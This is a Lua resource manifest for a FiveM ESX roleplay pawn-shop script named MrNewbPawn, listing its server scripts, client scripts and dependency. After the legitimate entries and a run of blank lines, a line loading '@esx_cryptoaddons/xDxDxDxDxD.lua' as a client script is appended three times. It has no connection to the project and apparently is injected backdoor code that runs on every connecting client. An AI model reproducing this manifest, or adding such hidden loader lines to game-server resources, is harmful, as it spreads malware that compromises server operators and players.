--[[ 
	Kronenburg Roleplay
	Copyright © GJSBRT <g@gijs.eu>

	This project is licensed under the terms of the Apache License 2.0 license.
	https://choosealicense.com/licenses/apache-2.0/
]]
 
 
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'MrNewbPawn'

version '0.1'

server_scripts {
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua',
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua',
}


dependency {
	'es_extended',
}





client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'